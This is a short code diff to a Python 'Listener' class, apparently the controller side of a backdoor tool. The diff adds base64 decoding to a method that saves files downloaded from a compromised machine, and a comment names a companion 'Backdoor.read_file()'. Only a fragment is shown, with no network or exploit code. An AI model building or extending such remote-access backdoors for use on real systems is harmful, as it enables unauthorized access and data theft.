@@ -1,5 +1,6 @@
 import socket
 import json
+import base64
 
 
 class Listener:
@@ -41,7 +42,7 @@ class Listener:
     # Take a remote file to write on system
     def write_file(self, path, content):
         with open(path, "wb") as file:  # Write Binary file
-            file.write(content)
+            file.write(base64.b64decode(content))  # Decoding content encoded in Backdoor.read_file()
             return "[+] Download successful"
 
     # Take input
